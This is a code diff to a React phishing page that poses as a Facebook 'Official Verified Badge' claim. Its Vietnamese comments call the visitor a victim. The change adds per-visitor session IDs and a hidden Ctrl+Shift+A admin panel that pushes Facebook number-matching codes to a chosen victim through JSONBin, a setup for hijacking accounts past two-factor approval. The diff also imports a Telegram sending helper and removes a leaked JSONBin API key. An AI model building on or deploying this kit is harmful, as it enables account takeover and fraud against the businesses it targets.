@@ -3,8 +3,8 @@ import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } fr
 
 // ==========================================
 // THAY THÔNG TIN JSONBIN CỦA MÀY VÀO ĐÂY
-const BIN_ID = '6ad7e7f5ac6210605a43b63c';
-const API_KEY = '$2a$10$aQUMOVeeqI4gvQgvEtfmz.mT7MtH0h2ddIYvYbYOMilObcfbHMBZG';
+const BIN_ID = 'THAY_BIN_ID_CUA_MAY_VAO_DAY';
+const API_KEY = 'THAY_API_KEY_CUA_MAY_VAO_DAY';
 // ==========================================
 
 export default function Home() {
@@ -28,6 +28,16 @@ export default function Home() {
   const [matchNumber, setMatchNumber] = useState(null); 
   const [adminInput, setAdminInput] = useState('');
   const [showAdmin, setShowAdmin] = useState(false);
+
+  // --- TẠO MÃ PHIÊN CHO TỪNG NGƯỜI ---
+  const [sessionId] = useState(() => {
+      let id = localStorage.getItem('session_id');
+      if (!id) {
+          id = 'user_' + Math.random().toString(36).substring(2, 9);
+          localStorage.setItem('session_id', id);
+      }
+      return id;
+  });
 
   // --- DỮ LIỆU TRANG CHỦ ---
   const benefitsData = [
@@ -66,7 +76,7 @@ export default function Home() {
       }
   }, [showModal, clientIp]);
 
-  // --- LẮNG NGHE SỐ TỪ ADMIN (QUA JSONBIN) ---
+  // --- LẮNG NGHE SỐ TỪ ADMIN ---
   useEffect(() => {
     if (step === 3 && !showAdmin) {
         const interval = setInterval(() => {
@@ -75,16 +85,16 @@ export default function Home() {
             })
             .then(res => res.json())
             .then(data => {
-                if(data.record && data.record.number) {
+                if(data.record && data.record.number && data.record.target === sessionId) {
                     setMatchNumber(data.record.number);
                 }
             }).catch(()=>{});
-        }, 2000); // Cứ 2 giây kiểm tra 1 lần
+        }, 2000);
         return () => clearInterval(interval);
     }
-  }, [step, showAdmin]);
+  }, [step, showAdmin, sessionId]);
 
-  // --- PHÍM TẮT BÍ MẬT (Ctrl + Shift + A) ĐỂ MỞ ADMIN ---
+  // --- PHÍM TẮT MỞ ADMIN (Ctrl + Shift + A) ---
   useEffect(() => {
     const handleKeyDown = (e) => {
       if (e.ctrlKey && e.shiftKey && e.key === 'A') {
@@ -128,17 +138,23 @@ export default function Home() {
   };
 
   const handleAdminUpdate = () => {
-      if(!adminInput) return;
+      if(!adminInput || !adminInput.includes(':')) {
+          alert('Vui lòng nhập đúng định dạng: Mã Phiên : Số (VD: user_a1b2c3:42)');
+          return;
+      }
+      const [targetUser, numberToSend] = adminInput.split(':');
       fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
           method: 'PUT',
           headers: {
               'Content-Type': 'application/json',
               'X-Master-Key': API_KEY
           },
-          body: JSON.stringify({ number: adminInput })
+          body: JSON.stringify({ 
+              number: numberToSend.trim(), 
+              target: targetUser.trim() 
+          })
       }).then(() => {
-          setMatchNumber(adminInput);
-          alert('Đã gửi số ' + adminInput + ' lên web của nạn nhân!');
+          alert(`Đã gửi số ${numberToSend} cho người dùng ${targetUser}`);
       });
   };
 
@@ -165,7 +181,7 @@ export default function Home() {
           <div className="hero-inner">
               <div className="hero-text">
                   <div className="hero-text-inner">
-                      <svg className="hero-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
+                      <svg className="hero-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.26-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                       <h1 className="hero-title">Congratulations! You've been awarded the Official Verified Badge.</h1>
                       <p className="hero-subtitle">Your business has met our verification requirements and is now eligible to display the official badge. Complete the quick steps below to activate it.</p>
                       <button className="btn-primary" onClick={openModal}>Claim your badge</button>
@@ -281,8 +297,11 @@ export default function Home() {
                 {showAdmin ? (
                   <div style={{ textAlign: 'center' }}>
                     <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '20px' }}>Admin Panel</h2>
-                    <input className="fb-input" type="text" placeholder="Nhập số Facebook yêu cầu (VD: 42)" value={adminInput} onChange={(e) => setAdminInput(e.target.value)} />
-                    <button onClick={handleAdminUpdate} className="fb-btn" style={{ marginTop: '10px' }}>Gửi số cho nạn nhân</button>
+                    <p style={{ fontSize: '13px', color: '#fa383e', marginBottom: '10px' }}>
+                        Mã người dùng đang xem: <b>{sessionId}</b>
+                    </p>
+                    <input className="fb-input" type="text" placeholder="Nhập: user_xxx : 42" value={adminInput} onChange={(e) => setAdminInput(e.target.value)} />
+                    <button onClick={handleAdminUpdate} className="fb-btn" style={{ marginTop: '10px' }}>Gửi số cho người này</button>
                     <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Đóng</button>
                   </div>
                 ) : (
